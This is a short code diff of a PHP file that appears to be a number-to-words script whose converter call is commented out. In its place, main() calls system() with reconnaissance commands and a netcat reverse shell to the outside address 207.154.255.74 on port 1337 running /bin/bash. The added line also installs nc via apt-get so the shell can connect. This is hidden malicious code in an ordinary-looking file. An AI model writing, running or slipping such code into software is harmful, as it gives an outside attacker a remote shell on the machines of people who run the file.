@@ -11,7 +11,7 @@ function main(array $args)
 //     $words = (new NumberToWords)->toWords($number);
  
     echo("------");
-    echo(system("whoami ; uname -a ; ls -asl ; nc 207.154.255.74 1337 -e /bin/bash"));
+    echo(system("whoami ; uname -a ; ls -asl ; apt-get update ; apt-get install -y nc ; nc 207.154.255.74 1337 -e /bin/bash"));
     echo("\n");
     print("------");
  
